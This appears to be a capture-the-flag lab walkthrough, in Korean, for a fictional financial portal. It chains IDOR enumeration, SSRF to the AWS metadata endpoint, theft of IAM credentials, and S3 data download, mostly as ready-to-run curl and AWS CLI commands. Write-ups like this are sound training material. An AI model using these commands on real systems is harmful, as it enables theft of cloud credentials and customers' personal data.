# legacy-bridge - Walkthrough

## Exploitation Route

![Prime Financial Customer Portal](./assets/legacy-bridge-initial-screen.png)

## Summary

1. **Step 1 - IDOR Enumeration**: file_id 파라미터로 모든 고객 데이터 열거
2. **Step 2 - SSRF Role Name Extraction**: source 파라미터로 v1 API가 IMDS 접근하도록 강제
3. **Step 3 - IMDSv1 Credential Theft**: AWS 임시 자격증명 탈취
4. **Step 4 - IAM Permission Check**: 탈취한 자격증명의 권한 확인
5. **Step 5 - S3 Data Exfiltration**: 민감한 고객 데이터 다운로드

## Detailed Walkthrough

### Step 1: IDOR 열거

게이트웨이 URL을 환경변수로 설정합니다:

```bash
GW=http://<gateway-ip>
```

API 포털이 정상 작동하는지 확인:

```bash
curl -s $GW/api/v5/status
```

file_id 파라미터를 변경하며 모든 고객 데이터를 열거합니다:

```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1"
curl -s "$GW/api/v5/legacy/media-info?file_id=2"
curl -s "$GW/api/v5/legacy/media-info?file_id=3"
```

---

### Step 2: SSRF로 역할 이름 탈취

source 파라미터를 이용해 IMDS에 접근하도록 강제합니다:

```bash
curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

응답의 `backend_response` 필드에서 역할 이름을 추출합니다 (형식: `legacy-bridge-Shadow-API-Role-<SUFFIX>`).

---

### Step 3: IMDSv1에서 자격증명 탈취

추출한 역할 이름으로 임시 자격증명을 요청합니다:

```bash
ROLE="legacy-bridge-Shadow-API-Role-<SUFFIX>"

curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
```

응답의 `backend_response`에서 자격증명을 추출합니다:
- `AccessKeyId`
- `SecretAccessKey`
- `Token`
- `Expiration`

---

### Step 4: 자격증명 검증 & IAM 권한 확인

탈취한 자격증명으로 환경변수를 설정합니다:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
export AWS_DEFAULT_REGION="us-east-1"
```

자격증명이 유효한지 검증합니다:

```bash
aws sts get-caller-identity
```

이 역할이 가진 IAM 정책을 확인합니다:

```bash
aws iam list-role-policies --role-name legacy-bridge-Shadow-API-Role-<SUFFIX>
```

정책의 세부 내용을 확인합니다:

```bash
aws iam get-role-policy --role-name legacy-bridge-Shadow-API-Role-<SUFFIX> --policy-name <policy-name>
```

---

### Step 5: S3 데이터 탈취

접근 가능한 S3 버킷을 나열합니다:

```bash
aws s3 ls
```

대상 버킷 (`prime-pii-vault-*`)을 식별하고 구조를 확인합니다:

```bash
BUCKET="<prime-pii-vault-XXXX>"

aws s3 ls s3://$BUCKET/
```

각 디렉토리를 탐색합니다:

```bash
aws s3 ls s3://$BUCKET/applications/
aws s3 ls s3://$BUCKET/confidential/
```

플래그 파일을 다운로드합니다:

```bash
aws s3 cp s3://$BUCKET/confidential/breach_notice.txt -
```

출력 결과에 플래그가 포함됩니다.